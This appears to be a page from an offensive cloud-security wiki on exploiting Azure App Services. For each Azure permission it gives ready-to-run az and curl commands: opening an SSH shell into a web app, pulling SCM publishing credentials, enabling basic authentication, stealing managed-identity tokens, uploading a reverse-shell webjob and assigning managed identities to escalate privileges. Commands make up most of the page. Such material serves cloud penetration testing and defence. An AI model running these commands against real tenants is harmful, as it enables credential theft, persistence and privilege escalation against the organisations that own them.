---
title: "Azure App Services Explotation"
order: 92
description: Explotation of Azure App Services
---

## Get a shell

> The following permissions are required:
> - **Microsoft.Web/sites/publish/Action**
> - **Microsoft.Web/sites/basicPublishingCredentialsPolicies/read**
> - **Microsoft.Web/sites/config/read**
> - **Microsoft.Web/sites/read**
>
> These permissions allow to get a SSH shell inside a web app. They also allow to debug the application.

```bash
az webapp ssh --name $APP_NAME --resource-group $RESOURCE_GROUP
```

```bash
az webapp create-remote-connection --name $APP_NAME --resource-group $RESOURCE_GROUP

## If successful you will get a message such as:
#Verifying if app is running....
#App is running. Trying to establish tunnel connection...
#Opening tunnel on port: 39895
#SSH is available { username: root, password: Docker! }

## So from that machine ssh into that port (you might need generate a new ssh session to the jump host)
ssh root@127.0.0.1 -p 39895
```

If you see that those credentials are REDACTED, it’s because you need to enable the SCM basic authentication option and for that you need the second permission

## Obtain SCM credentials

> The permission needed is:
> - **Microsoft.Web/sites/publishxml/action**
>
> This allows an ttacker to obtain the SMC credentials.

```bash
az webapp deployment list-publishing-profiles \
  --name $APP_NAME \
  --resource-group $RESOURCE_GROUP
```

## Enable basic authentication

> The permission needed is:
> - **Microsoft.Web/sites/basicPublishingCredentialsPolicies/write**
>
> Allows an attacker to enable basic authentication

```bash
az rest --method PUT \
  --uri "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.Web/sites/$APP_NAME/basicPublishingCredentialsPolicies/scm?api-version=2022-03-01" \
  --body '{"properties": {"allow": true}}'
```

## KUDU Access

```bash
https://$APP_NAME.scm.azurewebsites.net/BasicAuth
```

### Obtain token of System MI

Check env

```bash
curl -s "http://169.254.129.5:8081/msi/token?resource=https://vault.azure.net&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
```

### Obtain token of Users MI

```bash
curl -s "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://vault.azure.net&client_id=$UAMI_ID" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
```

## Webjobs - SCM credentials

> The permission required is:
> - Microsoft.Web/sites/publish/Action
>
> The mentioned Azure permission allows to perform several interesting actions that can also be performed with the SCM credentials:

### Read Webjobs logs

```bash
az rest --method GET --url "<SCM-URL>/vfs/data/jobs/<continuous | triggered>/rev5/job_log.txt"  --resource "https://management.azure.com/"
```

```bash
curl -s \
  --user '<user>:<password>' \
  "https://$APP_NAME.scm.azurewebsites.net/api/triggeredwebjobs/flagjob/history" | jq .
```

### Create continuous Webjob

```bash
az rest \
  --method put \
  --uri "https://$APP_NAME.scm.canadacentral-01.azurewebsites.net/api/Continuouswebjobs/reverse_shell" \
  --headers '{"Content-Disposition": "attachment; filename=\"rev.js\""}' \
  --body "@/Users/username/Downloads/rev.js" \
  --resource "https://management.azure.com/"
```

```bash
curl -v -X PUT \
  "https://$APP_NAME.scm.azurewebsites.net/api/triggeredwebjobs/flagjob" \
  -H "Content-Disposition: attachment; filename=webjob.zip" \
  -H "Content-Type: application/zip" \
  --data-binary "@webjob.zip" \
  --user '<user>:<password>'
```

### Execute webjob

```bash
curl -X POST \
  "https://$APP_NAME.scm.azurewebsites.net/api/triggeredwebjobs/flagjob/run" \
  --user '<user>:<password>'
```

## Assign MI

> The following permissions are needed:
> - **Microsoft.Web/sites/write**
> - **Microsoft.Web/sites/read**
> - **Microsoft.ManagedIdentity/userAssignedIdentities/assign/action**
>
> These permissions allow to assign a managed identity to the App service, so if an App service was previously compromised this will allow the attacker to assign new managed identities to the App service and escalate privileges to them.

```bash
az webapp identity assign \
  --name $APP_NAME \
  --resource-group $RESOURCE_GROUP \
  --identities "/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.ManagedIdentity/userAssignedIdentities/$MANAGED_IDENTITY"
```